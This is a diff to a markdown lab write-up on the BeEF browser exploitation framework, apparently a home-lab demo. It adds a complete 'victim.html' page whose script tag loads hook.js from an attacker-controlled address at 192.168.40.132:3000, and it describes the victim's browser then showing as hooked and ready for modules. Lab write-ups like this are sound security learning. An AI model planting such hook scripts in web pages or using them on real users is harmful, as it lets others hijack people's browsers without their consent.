@@ -160,48 +160,39 @@ Checked network info:
 ip a
 ```
 
-## Hooking a Browser
+### 7. Hooking the Browser (The Lazy Way)
+Once Beef was running, the next step was to hook a browser so it shows up inside the Beef control panel. Normally, you would host a webpage on a server and get the target to load it through social engineering or a redirected link.  
 
-BeEF creates a script called `hook.js` that you include on a webpage. Once someone opens that page, their browser shows up as “hooked” in the BeEF dashboard.
+**Because I was lazy and this was just a demo**, I skipped all the proper hosting steps. Instead, I created a simple HTML file directly on the victim machine and opened it locally in the browser. Beef doesn’t care where the page is hosted, as long as the browser loads the hook script.
 
-Here’s what I did:
+Here’s the exact page I used:
 
 ```html
-<script src="http://123.123.123.123:3000/hook.js"></script>
+<!-- victim.html -->
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Test Page</title>
+  </head>
+  <body>
+    <h1>Hello, this is a safe test page</h1>
+
+    <!-- Hook BeEF -->
+    <script src="http://192.168.40.132:3000/hook.js"></script>
+  </body>
+</html>
 ```
 
-After loading the page, I could see the hooked browser in the dashboard.
+All the browser has to do is load that one script tag:
 
----
-
-## Web Server Settings
-
-I also checked `config.yaml` to see how the web server was set up. Here’s the main section I used:
-
-```yaml
-http:
-    debug: false
-    host: "0.0.0.0"
-    port: "3000"
-
-    public:
-        host: "example.com"
-        port: "3000"
-        https: false
-
-    dns: "localhost"
-    hook_file: "/hook.js"
-    hook_session_name: "BEEFHOOK"
-    session_cookie_name: "BEEFSESSION"
+```
+http://192.168.40.132:3000/hook.js
 ```
 
-I didn’t change much, just made sure the host and port were correct so the hook worked.
+As soon as I opened the file on the victim PC, the browser appeared as **hooked** inside the Beef UI, and I could start running modules on it.
 
----
-
-## Screenshots
-
-Here are the main things I saw during the lab:
+### Screenshots
+Here are screenshots from the Beef server, including topology.
 
 ```markdown
 ![Browser Info](images/browserInfo.png)
